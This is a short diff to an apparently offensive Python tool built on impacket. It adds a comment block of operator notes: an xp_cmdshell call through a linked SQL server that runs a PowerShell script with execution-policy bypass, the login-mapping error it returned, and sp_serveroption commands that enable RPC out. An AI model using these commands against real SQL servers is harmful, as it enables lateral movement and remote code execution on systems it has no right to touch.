@@ -15,6 +15,17 @@ from playbooks.playbooks import Playbooks
 from impacket.examples.utils import parse_target
 
 
+"""
+login-mapping
+SQL (WEB06\Administrator  dbo@master)> EXECUTE('xp_cmdshell "powershell -ep bypass -File C:\\Windows\\Temp\\p.ps1";') AT SQL03
+[-] ERROR(WEB06\SQLEXPRESS): Line 1: Access to the remote server is denied because no login-mapping exists.
+
+
+EXEC sp_serveroption 'SQLSRV01','rpc','true';
+EXEC sp_serveroption 'SQLSRV01','rpc out','true';
+
+"""
+
 def main():
     # Init the example's logger theme
     logger.init()
